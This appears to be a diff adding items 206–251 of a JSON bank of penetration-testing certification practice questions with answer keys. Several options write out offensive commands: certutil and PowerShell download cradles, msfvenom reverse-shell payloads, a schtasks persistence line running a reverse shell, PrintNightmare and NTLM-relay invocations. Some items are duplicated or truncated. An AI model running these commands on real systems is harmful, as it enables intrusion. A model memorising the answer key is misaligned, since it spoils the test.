+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 206,
+    "question": "During a penetration test, the tester identifies several unused services that are listening on all targeted internal laptops. Which of the following technical controls should the tester recommend to reduce the risk of compromise?",
+    "options": {
+      "A": "Multifactor authentication",
+      "B": "Patch management",
+      "C": "System hardening",
+      "D": "Network segmentation"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 207,
+    "question": "A penetration tester needs to scan a remote infrastructure with Nmap. The tester issues the following command: nmap 10.10.1.0/24 Which of the following is the number of TCP ports that will be scanned?",
+    "options": {
+      "A": "256",
+      "B": "1,000",
+      "C": "1,024",
+      "D": "65,535"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 208,
+    "question": "Which of the following activities should be performed to prevent uploaded web shells from being exploited by others?",
+    "options": {
+      "A": "Remove the persistence mechanisms.",
+      "B": "Spin down the infrastructure.",
+      "C": "Preserve artifacts.",
+      "D": "Perform secure data destruction."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 209,
+    "question": "Which of the following is a term used to describe a situation in which a penetration tester bypasses physical access controls and gains access to a facility by entering at the same time as an employee?",
+    "options": {
+      "A": "Badge cloning",
+      "B": "Shoulder surfing",
+      "C": "Tailgating",
+      "D": "Site survey"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 210,
+    "question": "Which of the following explains the reason a tester would opt to use DREAD over PTES during the planning phase of a penetration test?",
+    "options": {
+      "A": "The tester is conducting a web application test.",
+      "B": "The tester is assessing a mobile application.",
+      "C": "The tester is evaluating a thick client application.",
+      "D": "The tester is creating a threat model."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 211,
+    "question": "A tester obtains access to an endpoint subnet and wants to move laterally in the network. Given the following output: kotlin Copy code Nmap scan report for some_host Host is up (0.01 latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: smb2-security-mode: Message signing disabled Which of the following command and attack methods is the most appropriate for reducing the chances of being detected?",
+    "options": {
+      "A": "responder -T eth0 -dwv ntlmrelayx.py -smb2support -tf <target>",
+      "B": "msf > use exploit/windows/smb/ms17_010_psexec msf > <set options> msf > run",
+      "C": "hydra -L administrator -P /path/to/passwdlist smb://<target>",
+      "D": "nmap —script smb-brute.nse -p 445 <target>"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 212,
+    "question": "A penetration tester needs to use the native binaries on a system in order to download a file from the internet and evade detection. Which of the following tools would the tester most likely use?",
+    "options": {
+      "A": "netsh.exe",
+      "B": "certutil.exe",
+      "C": "nc.exe",
+      "D": "cmdkey.exe"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 213,
+    "question": "Which of the following could be used to enhance the quality and reliability of a vulnerability scan report?",
+    "options": {
+      "A": "Risk analysis",
+      "B": "Peer review",
+      "C": "Root cause analysis",
+      "D": "Client acceptance"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 214,
+    "question": "A penetration tester completes a scan and sees the following Nmap output on a host: Nmap scan report for victim (10.10.10.10) Host is up (0.0001s latency) PORT STATE SERVICE 161/udp open snmp 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Running Microsoft Windows 7 OS CPE: cpe:/o:microsoft:windows_7::sp0 The tester wants to obtain shell access. Which of the following related exploits should the tester try first?",
+    "options": {
+      "A": "exploit/windows/smb/psexec",
+      "B": "exploit/windows/smb/ms08_067_netapi",
+      "C": "exploit/windows/smb/ms17_010_eternalblue",
+      "D": "auxiliary/scanner/snmp/snmp_login"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 215,
+    "question": "A penetration tester gains initial access to a target system by exploiting a recent RCE vulnerability. The patch for the vulnerability will be deployed at the end of the week. Which of the following utilities would allow the tester to reenter the system remotely after the patch has been deployed? (Select two).",
+    "options": {
+      "A": "schtasks.exe",
+      "B": "rundll.exe",
+      "C": "cmd.exe",
+      "D": "chgusr.exe",
+      "E": "sc.exe",
+      "F": "netsh.exe"
+    },
+    "correct": [
+      "A",
+      "E"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 216,
+    "question": "A company hires a penetration tester to perform an external attack surface review as part of a security engagement. The company informs the tester that the main company domain to investigate is comptia.org. Which of the following should the tester do to accomplish the assessment objective?",
+    "options": {
+      "A": "Perform information-gathering techniques to review internet-facing assets for the company.",
+      "B": "Perform a phishing assessment to try to gain access to more resources and users’ computers.",
+      "C": "Perform a physical security review to identify vulnerabilities that could affect the company.",
+      "D": "Perform a vulnerability assessment over the main domain address provided by the client."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 217,
+    "question": "A penetration tester gains initial access to an endpoint and needs to execute a payload to obtain additional access. Which of the following commands should the penetration tester use?",
+    "options": {
+      "A": "powershell.exe impo C:\\tools\\foo.ps1",
+      "B": "certutil.exe -f https://192.168.0.1/foo.exe bad.exe",
+      "C": "powershell.exe -noni -encode IEX.Downloadstring(\"http://172.16.0.1/\")",
+      "D": "rundll32.exe c:\\path\\foo.dll,functName"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 218,
+    "question": "During a routine penetration test, the client’s security team observes logging alerts that indicate several ID badges were reprinted after working hours without authorization. Which of the following is the penetration tester most likely trying to do?",
+    "options": {
+      "A": "Obtain long-term, valid access to the facility",
+      "B": "Disrupt the availability of facility access systems",
+      "C": "Change access to the facility for valid users",
+      "D": "Revoke access to the facility for valid users"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 219,
+    "question": "During a testing engagement, a penetration tester compromises a host and locates data for exfiltration. Which of the following are the best options to move the data without triggering a data loss prevention tool? (Select two).",
+    "options": {
+      "A": "Move the data using a USB flash drive.",
+      "B": "Compress and encrypt the data.",
+      "C": "Rename the file name extensions.",
+      "D": "Use FTP for exfiltration.",
+      "E": "Encode the data as Base64.",
+      "F": "Send the data to a commonly trusted service."
+    },
+    "correct": [
+      "B",
+      "E"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 220,
+    "question": "While conducting a reconnaissance activity, a penetration tester extracts the following information: Emails: - admin@acme.com - sales@acme.com - support@acme.com Which of the following risks should the tester use to leverage an attack as the next step in the security assessment?",
+    "options": {
+      "A": "Unauthorized access to the network",
+      "B": "Exposure of sensitive servers to the internet",
+      "C": "Likelihood of SQL injection attacks",
+      "D": "Indication of a data breach in the company"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 221,
+    "question": "A tester wants to pivot from a compromised host to another network with encryption and the least amount of interaction with the compromised host. Which of the following is the best way to accomplish this objective?",
+    "options": {
+      "A": "Create an SSH tunnel using sshuttle to forward all the traffic to the compromised computer.",
+      "B": "Configure a VNC server on the target network and access the VNC server from the compromised",
+      "C": "Set up a Metasploit listener on the compromised computer and create a reverse shell on the target",
+      "D": "Create a Netcat connection to the compromised computer and forward all the traffic to the target"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 222,
+    "question": "A penetration tester aims to exploit a vulnerability in a wireless network that lacks proper encryption. The lack of proper encryption allows malicious content to infiltrate the network. Which of the following techniques would most likely achieve the goal?",
+    "options": {
+      "A": "Packet injection",
+      "B": "Bluejacking",
+      "C": "Beacon flooding",
+      "D": "Signal jamming"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 223,
+    "question": "During a vulnerability assessment, a penetration tester configures the scanner sensor and performs the initial vulnerability scanning under the client's internal network. The tester later discusses the results with the client, but the client does not accept the results. The client indicates the host and assets that were within scope are not included in the vulnerability scan results. Which of the following should the tester have done?",
+    "options": {
+      "A": "Rechecked the scanner configuration.",
+      "B": "Performed a discovery scan.",
+      "C": "Used a different scan engine.",
+      "D": "Configured all the TCP ports on the scan."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 224,
+    "question": "Which of the following describes the process of determining why a vulnerability scanner is not providing results?",
+    "options": {
+      "A": "Root cause analysis",
+      "B": "Secure distribution",
+      "C": "Peer review",
+      "D": "Goal reprioritization"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 225,
+    "question": "While performing reconnaissance, a penetration tester attempts to identify publicly accessible ICS (Industrial Control Systems) and IoT (Internet of Things) systems. Which of the following tools is most effective for this task?",
+    "options": {
+      "A": "theHarvester",
+      "B": "Shodan",
+      "C": "Amass",
+      "D": "Nmap"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 226,
+    "question": "A penetration tester is performing an authorized physical assessment. During the test, the tester observes an access control vestibule and on-site security guards near the entry door in the lobby. Which of the following is the best attack plan for the tester to use in order to gain access to the facility?",
+    "options": {
+      "A": "Clone badge information in public areas of the facility to gain access to restricted areas.",
+      "B": "Tailgate into the facility during a very busy time to gain initial access.",
+      "C": "Pick the lock on the rear entrance to gain access to the facility and try to gain access.",
+      "D": "Drop USB devices with malware outside of the facility in order to gain access to internal machines."
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 227,
+    "question": "A penetration tester is performing a security review of a web application. Which of the following should the tester leverage to identify the presence of vulnerable open-source libraries?",
+    "options": {
+      "A": "VM",
+      "B": "IAST",
+      "C": "DAST",
+      "D": "SCA"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 228,
+    "question": "During a penetration test, a tester attempts to pivot from one Windows 10 system to another Windows system. The penetration tester thinks a local firewall is blocking connections. Which of the following command-line utilities built into Windows is most likely to disable the firewall?",
+    "options": {
+      "A": "certutil.exe",
+      "B": "bitsadmin.exe",
+      "C": "msconfig.exe",
+      "D": "netsh.exe"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 229,
+    "question": "During host discovery, a security analyst wants to obtain GeoIP information and a comprehensive summary of exposed services. Which of the following tools is best for this task?",
+    "options": {
+      "A": "WiGLE.net",
+      "B": "WHOIS",
+      "C": "theHarvester",
+      "D": "Censys.io"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 230,
+    "question": "A penetration tester finished a security scan and uncovered numerous vulnerabilities on several hosts. Based on the targets' EPSS and CVSS scores, which of the following targets is the most likely to get attacked? Host | CVSS | EPSS Target 1 | 4 | 0.6 Target 2 | 2 | 0.3 Target 3 | 1 | 0.6 Target 4 | 4.5 | 0.4",
+    "options": {
+      "A": "Target 1: CVSS Score = 4 and EPSS Score = 0.6",
+      "B": "Target 2: CVSS Score = 2 and EPSS Score = 0.3",
+      "C": "Target 3: CVSS Score = 1 and EPSS Score = 0.6",
+      "D": "Target 4: CVSS Score = 4.5 and EPSS Score = 0.4"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 231,
+    "question": "During a penetration testing exercise, a team decides to use a watering hole strategy. Which of the following is the most effective approach for executing this attack?",
+    "options": {
+      "A": "Compromise a website frequently visited by the organization's employees.",
+      "B": "Launch a DDoS attack on the organization's website.",
+      "C": "Create fake social media profiles to befriend employees.",
+      "D": "Send phishing emails to the organization's employees."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 232,
+    "question": "During a web application assessment, a penetration tester identifies an input field that allows JavaScript injection. The tester inserts a line of JavaScript that results in a prompt, presenting a text box when browsing to the page going forward. Which of the following types of attacks is this an example of? A.",
+    "options": {
+      "A": "SQL injection",
+      "B": "SSRF",
+      "C": "XSS",
+      "D": "Server-side template injection"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 233,
+    "question": "Given the following statements: Implement a web application firewall. Upgrade end-of-life operating systems. Implement a secure software development life cycle. In which of the following sections of a penetration test report would the above statements be found?",
+    "options": {
+      "A": "Executive summary",
+      "B": "Attack narrative",
+      "C": "Detailed findings",
+      "D": "Recommendations"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Reporting and Communication"
+  },
+  {
+    "id": 234,
+    "question": "A penetration tester writes a Bash script to automate the execution of a ping command on a Class C network: bash for var in —MISSING TEXT— do ping -c 1 192.168.10.$var done Which of the following pieces of code should the penetration tester use in place of the —MISSING TEXT— placeholder?",
+    "options": {
+      "A": "crunch 1 254 loop",
+      "B": "seq 1 254",
+      "C": "echo 1-254",
+      "D": "{1.-254}"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 235,
+    "question": "A tester obtains access to an endpoint subnet and wants to move laterally in the network. Given the following Nmap scan output: Nmap scan report for some_host Host is up (0.01s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: smb2-security-mode: Message signing disabled Which of the following command and attack methods is the most appropriate for reducing the chances of being detected?",
+    "options": {
+      "A": "responder -I eth0 -dwv ntlmrelayx.py -smb2support -tf <target>",
+      "B": "msf > use exploit/windows/smb/ms17_010_psexec",
+      "C": "hydra -L administrator -P /path/to/passwdlist smb://<target>",
+      "D": "nmap --script smb-brute.nse -p 445 <target>"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 236,
+    "question": "A penetration tester is developing the rules of engagement for a potential client. Which of the following would most likely be a function of the rules of engagement?",
+    "options": {
+      "A": "Testing window",
+      "B": "Terms of service",
+      "C": "Authorization letter",
+      "D": "Shared responsibilities"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 237,
+    "question": "A penetration tester performs a service enumeration process and receives the following result after scanning a server using the Nmap tool: bash PORT STATE SERVICE 22/tcp open ssh 25/tcp filtered smtp 111/tcp open rpcbind 2049/tcp open nfs Based on the output, which of the following services provides the best target for launching an attack?",
+    "options": {
+      "A": "Database",
+      "B": "Remote access",
+      "C": "Email",
+      "D": "File sharing"
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 238,
+    "question": "During an assessment, a penetration tester gains access to one of the internal hosts. Given the following command: schtasks /create /sc onlogon /tn \"Windows Update\" /tr \"cmd.exe /c reverse_shell.exe\" Which of the following is the penetration tester trying to do with this code?",
+    "options": {
+      "A": "Enumerate the scheduled tasks",
+      "B": "Establish persistence",
+      "C": "Deactivate the Windows Update functionality",
+      "D": "Create a binary application for Windows System Updates"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 239,
+    "question": "A tester performs a vulnerability scan and identifies several outdated libraries used within the customer SaaS product offering. Which of the following types of scans did the tester use to identify the libraries?",
+    "options": {
+      "A": "IAST",
+      "B": "SBOM",
+      "C": "DAST",
+      "D": "SAST"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 240,
+    "question": "During a penetration test, a tester captures information about an SPN account. Which of the following attacks requires this information as a prerequisite to proceed?",
+    "options": {
+      "A": "Golden Ticket",
+      "B": "Kerberoasting",
+      "C": "DCShadow",
+      "D": "LSASS dumping"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 242,
+    "question": "During an assessment, a penetration tester obtains access to a Microsoft SQL server using sqlmap and runs the following command: sql> xp_cmdshell whoami /all Which of the following is the tester trying to do?",
+    "options": {
+      "A": "List database tables",
+      "B": "Show logged-in database users",
+      "C": "Enumerate privileges",
+      "D": "Display available SQL commands"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Planning and Scoping"
+  },
+  {
+    "id": 243,
+    "question": "A penetration tester currently conducts phishing reconnaissance using various tools and accounts for multiple intelligence-gathering platforms. The tester wants to consolidate some of the tools and accounts into one solution to analyze the output from the intelligence-gathering tools. Which of the following is the best tool for the penetration tester to use?",
+    "options": {
+      "A": "Caldera",
+      "B": "SpiderFoot",
+      "C": "Maltego",
+      "D": "WIGLE.net"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 244,
+    "question": "During an assessment, a penetration tester wants to extend the vulnerability search to include the use of dynamic testing. Which of the following tools should the tester use?",
+    "options": {
+      "A": "Mimikatz",
+      "B": "ZAP",
+      "C": "OllyDbg",
+      "D": "SonarQube"
+    },
+    "correct": [
+      "B"
+    ],
+    "category": "Tools and Code Analysis"
+  },
+  {
+    "id": 245,
+    "question": "A penetration tester is conducting a vulnerability scan. The tester wants to see any vulnerabilities that may be visible from outside of the organization. Which of the following scans should the penetration tester perform?",
+    "options": {
+      "A": "SAST",
+      "B": "Sidecar",
+      "C": "Unauthenticated",
+      "D": "Host-based"
+    },
+    "correct": [
+      "C"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 246,
+    "question": "A penetration tester is performing network reconnaissance. The tester wants to gather information about the network without causing detection mechanisms to flag the reconnaissance activities. Which of the following techniques should the tester use?",
+    "options": {
+      "A": "Sniffing",
+      "B": "Banner grabbing",
+      "C": "TCP/UDP scanning",
+      "D": "Ping sweeps"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Information Gathering and Vulnerability Scanning"
+  },
+  {
+    "id": 247,
+    "question": "While conducting an assessment, a penetration tester identifies the details for several unreleased products announced at a company-wide meeting. Which of the following attacks did the tester most likely use to discover this information?",
+    "options": {
+      "A": "Eavesdropping",
+      "B": "Bluesnarfing",
+      "C": "Credential harvesting",
+      "D": "SQL injection attack"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 249,
+    "question": "During an assessment, a penetration tester manages to get RDP access via a low-privilege user. The tester attempts to escalate privileges by running the following commands: Import-Module .\\PrintNightmare.ps1 Invoke-Nightmare -NewUser \"hacker\" -NewPassword \"Password123!\" -DriverName \"Print\" The tester attempts to further enumerate the host with the new administrative privileges by using the runas command. However, the access level is still low. Which of the following actions should the penetration tester take next?",
+    "options": {
+      "A": "Log off and log on with \"hacker\".",
+      "B": "Attempt to add another user.",
+      "C": "Bypass the execution policy.",
+      "D": "Add a malicious printer driver."
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 250,
+    "question": "A penetration tester attempts to run an automated web application scanner against a target URL. The tester validates that the web page is accessible from a different device. The tester analyzes the following HTTP request header logging output: 200; GET /login.aspx HTTP/1.1 Host: foo.com; User-Agent: Mozilla/5.0 200; GET /login.aspx HTTP/1.1 Host: foo.com; User-Agent: Mozilla/5.0 No response; POST /login.aspx HTTP/1.1 Host: foo.com; User-Agent: curl 200; POST /login.aspx HTTP/1.1 Host: foo.com; User-Agent: Mozilla/5.0 No response; GET /login.aspx HTTP/1.1 Host: foo.com; User-Agent: python Which of the following actions should the tester take to get the scans to work properly?",
+    "options": {
+      "A": "Modify the scanner to slow down the scan.",
+      "B": "Change the source IP with a VPN.",
+      "C": "Modify the scanner to only use HTTP GET requests.",
+      "D": "Modify the scanner user agent."
+    },
+    "correct": [
+      "D"
+    ],
+    "category": "Attacks and Exploits"
+  },
+  {
+    "id": 251,
+    "question": "A penetration tester is ready to add shellcode for a specific remote executable exploit. The tester is trying to prevent the payload from being blocked by antimalware that is running on the target. Which of the following commands should the tester use to obtain shell access?",
+    "options": {
+      "A": "msfvenom --arch x86-64 --platform windows --encoder x86-64/shikata_ga_nai --payload windows",
+      "B": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=8000",
+      "C": "msfvenom --arch x86-64 --platform windows --payload windows/shell_reverse_tcp LHOST=10.",
+      "D": "net user add /administrator | hexdump > payload"
+    },
+    "correct": [
+      "A"
+    ],
+    "category": "Attacks and Exploits"
+  }
+]
